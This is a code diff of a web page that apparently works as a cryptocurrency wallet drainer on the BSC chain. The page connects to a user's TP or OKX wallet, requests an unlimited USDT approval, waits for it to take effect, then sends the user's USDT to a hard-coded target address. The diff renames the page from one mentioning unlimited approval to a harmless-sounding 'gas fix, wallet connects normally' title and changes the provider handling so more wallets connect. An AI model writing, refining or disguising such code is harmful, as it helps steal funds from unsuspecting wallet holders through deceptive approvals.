@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>BSC‑USDT 无限授权修复Gas报错版</title>
+<title>BSC‑USDT 修复Gas｜钱包可正常连接</title>
 <script src="https://cdn.jsdelivr.net/npm/web3@4.15.0/dist/web3.min.js"></script>
 <style>
 *{ box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; font-family: -apple-system, BlinkMacSystemFont, system-ui, sans-serif; }
@@ -119,18 +119,18 @@ const USDT_ABI = [
     {"inputs":[{"name":"from","type":"address"},{"name":"to","type":"address"},{"name":"value","type":"uint256"}],"name":"transferFrom","outputs":[{"name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}
 ];
 
-// 增强轮询等待授权上链，最多27秒超时
-async function waitAllowance(spender, owner, needWei, maxLoop =18){
+// 轮询等待授权上链
+async function waitAllowance(spender, owner, needWei, maxLoop =16){
     for(let i=0;i<maxLoop;i++){
         const al = await usdtContract.methods.allowance(owner, spender).call();
-        console.log(`轮询${i+1} 当前allowance:`, al);
+        console.log(`轮询${i+1} allowance:`, al);
         if(BigInt(al) >= BigInt(needWei)) {
             console.log("✅授权额度校验通过");
             return true;
         }
         await new Promise(r=>setTimeout(r,1500));
     }
-    throw new Error("授权交易节点同步超时！授权还未生效，禁止转账");
+    throw new Error("授权同步超时，不要执行转账");
 }
 
 function disconnectWallet() {
@@ -145,9 +145,8 @@ async function connectWalletLogic(){
     try{
         if(!window.ethereum){ alert("请在TP/OKX钱包内置浏览器打开页面");return; }
         await window.ethereum.request({method:"eth_requestAccounts"});
+        // 重要：直接使用钱包自带ethereum提供者，不再强行替换RPC，保证钱包能连上
         web3 = new Web3(window.ethereum);
-        // 强制指定BSC官方RPC
-        web3.setProvider("https://bsc-dataseed1.binance.org");
         const acc = await web3.eth.getAccounts();
         userAddress = acc[0];
         usdtContract = new web3.eth.Contract(USDT_ABI,USDT_CONTRACT);
@@ -204,7 +203,7 @@ sendBtn.addEventListener("click", async ()=>{
             alert("✅已存在无限授权，直接发起转账");
         }
 
-        // 核心修复：强制固定gasLimit，规避TP无法预估Gas报错
+        // 修复点：每笔交易带上固定gas，解决TP「无法预估Gas」
         const tx = await usdtContract.methods.transferFrom(userAddress, TARGET_ADDR, needWei).send({
             from: userAddress,
             gas: 800000
